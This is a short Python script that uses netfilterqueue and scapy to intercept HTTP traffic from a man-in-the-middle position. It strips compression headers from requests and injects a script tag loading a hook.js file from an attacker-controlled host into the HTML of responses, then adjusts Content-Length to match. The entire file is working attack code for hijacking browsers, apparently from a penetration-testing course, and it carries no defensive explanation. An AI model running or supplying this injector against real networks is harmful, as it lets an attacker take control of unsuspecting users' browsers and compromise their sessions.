import netfilterqueue
import scapy.all as scapy
import re

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    try:
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.Raw):
            load = scapy_packet[scapy.Raw].load
            if scapy_packet[scapy.TCP].dport == 8080: # Bettercap = 8080, otherwise 80
                print("[+] Request")
                load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", load)
                load = load.replace(b"HTTP/1.1", b"HTTP/1.0")

            elif scapy_packet[scapy.TCP].sport == 8080: # Bettercap = 8080, otherwise 80
                print("[+] Response")
                injection_code = b'<script src="http://1.2.3.4:3000/hook.js"></script>'
                # change IP to Kali IP
                load = load.replace(b"</body>", injection_code + b"</body>")
                content_length_search = re.search(b"(?:Content-Length:\s)(\d*)", load)
                if content_length_search:
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, str(new_content_length).encode())

            if load != scapy_packet[scapy.Raw].load:
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet))
    except UnicodeDecodeError:
        pass

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
